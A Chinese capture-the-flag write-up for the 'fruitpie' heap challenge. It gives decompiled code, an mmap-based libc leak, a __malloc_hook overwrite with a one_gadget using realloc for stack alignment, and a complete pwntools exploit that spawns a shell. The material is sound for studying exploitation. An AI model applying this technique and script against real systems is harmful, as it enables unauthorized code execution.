# 安恒三月赛
# fruitpie
## checksec
```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
## IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _DWORD size[3]; // [rsp+4h] [rbp-1Ch] BYREF
  char *v5; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  welcome();
  puts("Enter the size to malloc:");
  size[0] = readInt();
  v5 = (char *)malloc(size[0]);
  if ( !v5 )
  {
    puts("Malloc Error");
    exit(0);
  }
  printf("%p\n", v5);
  puts("Offset:");
  _isoc99_scanf("%llx", &size[1]);
  puts("Data:");
  read(0, &v5[*(_QWORD *)&size[1]], 0x10uLL);
  malloc(0xA0uLL);
  close(1);
  return 0;
}
```
可以申请任意大小的内存，之后chunk为基准可以向任意偏移地址写0x10字节。
思路是，申请一个很大的chunk，让其通过`mmap`进行分配，以此计算libcbase。再通过向`__malloc_hook`写`one gadget`获得权限。使用`one_gadget`栈需要满足一定的条件，所以通过将`__malloc_hook`覆盖为`realloc`进行调栈。
```c
malloc ---> __malloc_hook ---> realloc ---> __realloc_hook ---> one_gadget 
```
查看`realloc`的汇编代码:
```assembly
.text:0000000000098CA0 ; __unwind {
.text:0000000000098CA0                 push    r15             ; Alternative name is '__libc_realloc'
.text:0000000000098CA2                 push    r14
.text:0000000000098CA4                 push    r13
.text:0000000000098CA6                 push    r12
.text:0000000000098CA8                 push    rbp
.text:0000000000098CA9                 push    rbx
.text:0000000000098CAA                 sub     rsp, 18h
.text:0000000000098CAE                 mov     rax, cs:__realloc_hook_ptr
.text:0000000000098CB5                 mov     rax, [rax]
.text:0000000000098CB8                 test    rax, rax
.text:0000000000098CBB                 jnz     loc_98F50
.text:0000000000098CC1                 test    rsi, rsi
```
发现其有很多push，我们就通过这些指令来调节栈帧。
## exp
```python 
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./pwn'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27982)

elf = ELF(binary,checksec=False)
libc = ELF('./libc.so.6')

one_gadget=[0x4f365,0x4f3c2,0x10a45c]


sh.sendafter('Enter the size to malloc:', str(99999999))
sh.recvuntil('0x')
addr = int(sh.recv(12),16)
leak('chunk',hex(addr))

libc_base=addr+0x5f5eff0
leak('libc base',hex(libc_base))

one=libc_base+one_gadget[1]
realloc=libc_base+libc.sym['realloc']
#gdb.attach(sh)
offset=libc.sym["__malloc_hook"]+0x5f5eff0
leak('offset',hex(offset))

sh.sendlineafter('Offset:',hex(offset))
sh.sendafter('Data:',p64(one)+p64(realloc+0x4))

sh.interactive()
```
学习到通过`mmap`的内存来泄露libc，通过`realloc`进行调栈。